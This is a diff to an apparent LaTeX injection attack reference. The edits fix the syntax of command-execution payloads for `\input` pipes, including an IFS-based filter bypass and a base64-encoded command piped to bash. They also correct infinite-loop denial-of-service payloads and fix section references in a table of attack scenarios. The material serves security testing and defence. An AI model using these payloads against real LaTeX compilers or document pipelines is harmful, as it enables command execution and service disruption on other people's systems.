@@ -57,7 +57,7 @@ The `\input` command supports pipe syntax on some engines, allowing command exec
 | Subtype | Mechanism | Example |
 |---|---|---|
 | **Basic pipe input** | Command output fed directly as TeX input | `\input\|ls\|base64` |
-| **Quoted pipe syntax** | Alternative quoting for command arguments | `\input{"/bin/hostname"}` |
+| **Quoted pipe syntax** | Alternative quoting for command arguments using pipe operator | `\input|"hostname"` (note: pipe syntax uses `\input|"cmd"`, NOT `\input{"cmd"}` — the `{}` form is the file-path form, not the pipe-execution form) |
 | **IFS space bypass** | Uses `${IFS}` to substitute spaces in command arguments | `\input\|uname${IFS}-a\|base64` |
 | **Base64 command decode** | Encodes entire command in base64 to bypass filters | `\input\|echo${IFS}aWQ=\|base64${IFS}-d\|bash` |
 
@@ -293,7 +293,7 @@ TeX's Turing completeness means any document can consume unbounded CPU, memory, 
 | **`\loop\iftrue\repeat`** | Simplest infinite loop using TeX's built-in loop construct | `\loop\iftrue\repeat` |
 | **Recursive macro bomb** | Self-calling macro with no termination condition | `\def\nothing{\nothing}\nothing` |
 | **Mutual recursion** | Two macros calling each other indefinitely | `\def\a{\b}\def\b{\a}\a` |
-| **Counter overflow loop** | Loop condition that can never be satisfied due to arithmetic overflow | `\newcount\c\loop\advance\c by 1\repeat` (missing termination) |
+| **Counter overflow loop** | Infinite loop via `\loop...\iftrue...\repeat` — the `\iftrue` ensures the loop body always repeats. Note: `\loop...\repeat` **requires a conditional** (`\ifnum`, `\iftrue`, etc.) between `\loop` and `\repeat`; without one TeX produces a syntax error | `\newcount\c\loop\advance\c by 1\iftrue\repeat` |
 
 **Key Condition:** Works with `--no-shell-escape`. Even previewers that disable most TeX features are vulnerable if they allow `\loop`, `\def`, or `\newcommand`.
 
@@ -353,8 +353,8 @@ When LaTeX output is embedded in web pages — particularly through math renderi
 | **Collaborative LaTeX editor** | Multi-user platform (Overleaf, Papeeria) with shared compilation | §1, §2, §3, §5, §6 | **Critical** — lateral movement between user projects possible |
 | **Document generation pipeline** | Application generates LaTeX from user input (invoices, reports, certificates) | §4 (filter evasion) → §1/§2 | **High** — partial LaTeX injection through template interpolation |
 | **Math rendering in web apps** | Server-side LaTeX-to-image/SVG conversion for math formulas | §2 (file read), §6 (DoS), §7 (XSS) | **High** — formulas are often user-controlled |
-| **Academic submission system** | Authors submit `.tex`/`.sty` files for peer review | §3-2 (trojan style files), §1, §2, §5 | **High** — exploits trust in "text-only" files |
-| **Desktop compilation (local)** | User compiles downloaded `.tex` files locally | §1, §2, §3, §3-2 (virus), §5-1 | **Medium** — requires social engineering |
+| **Academic submission system** | Authors submit `.tex`/`.sty` files for peer review | §3-1 (trojan style files), §1, §2, §5 | **High** — exploits trust in "text-only" files |
+| **Desktop compilation (local)** | User compiles downloaded `.tex` files locally | §1, §2, §3, §3-1 (virus), §5-1 | **Medium** — requires social engineering |
 | **Flashcard / learning apps** | Apps compile LaTeX snippets for math display (e.g., Anki) | §2 (file read via §4-6 blocklist bypass), §7 (XSS) | **Medium** — CVE-2024-29073 |
 | **CI/CD documentation build** | Automated LaTeX compilation in build pipelines | §1, §2, §5 | **High** — access to CI secrets and build infrastructure |
 
